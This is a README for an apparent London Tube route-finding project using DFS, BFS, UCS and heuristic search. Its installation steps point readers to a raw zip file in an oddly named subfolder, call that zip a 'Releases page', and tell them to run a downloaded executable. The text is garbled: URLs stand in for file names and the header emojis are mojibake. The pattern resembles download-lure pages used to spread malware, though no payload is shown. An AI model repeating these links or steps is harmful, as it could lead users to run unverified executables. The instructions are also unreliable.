## üõ†Ô∏è Description

The "London-Tube-AI-Search-DFS-BFS-UCS-Heuristics" application helps you navigate the London Tube using various search algorithms. It employs Depth First Search (DFS), Breadth First Search (BFS), Uniform Cost Search (UCS), and Heuristic methods. This tool simplifies your journey by calculating optimal routes on the London Tube Map.

## üöÄ Getting Started

### System Requirements

- **Operating System:** Windows, macOS, or Linux
- **Python Version:** Python 3.6 or higher
- **Memory:** At least 2 GB RAM
- **Free Disk Space:** Minimum 100 MB
- **Internet Connection:** Required for downloading the application

### Installation Steps

1. **Visit the Download Page:**
   Head to the [Releases page](https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip).

2. **Download the Application:**
   Look for the latest version listed on the page. Click on the asset that matches your system:
   - For Windows users, download the `.exe` file.
   - For macOS users, download the `.dmg` file.
   - For Linux users, download the `https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip` file.

3. **Run the Installer:**
   - If you're on Windows, double-click the downloaded `.exe` file.
   - On macOS, open the `.dmg` file and drag the application to your Applications folder.
   - For Linux, extract the `https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip` file and follow the installation instructions in the README file provided.

4. **Open the Application:**
   Once the installation completes, locate and open the application from your system.

5. **Start Searching:**
   Enter your start and end tube stations. Choose your preferred search algorithm and hit "Search" to find the best route.

## üìö Features

- **Multiple Search Algorithms:** Use different strategies to find the best routes.
- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
- **Quick Search:** Get results instantly.
- **Visual Route Mapping:** See your route displayed on the Tube Map for clarity.

## üîç How It Works

This application utilizes four main algorithms:

1. **Depth First Search (DFS):** Explores as far as possible along each branch before backtracking.
2. **Breadth First Search (BFS):** Explores all neighbor nodes at the present depth prior to moving on to nodes at the next depth level.
3. **Uniform Cost Search (UCS):** Extends the lowest cost node first, ideal for finding the least time or distance.
4. **Heuristic Search:** Uses problem-specific knowledge to find solutions faster.

## üéâ Additional Notes

- The application may require permissions to access network resources for map data and route optimization.
- Make sure to check for updates often to benefit from new features and improvements.
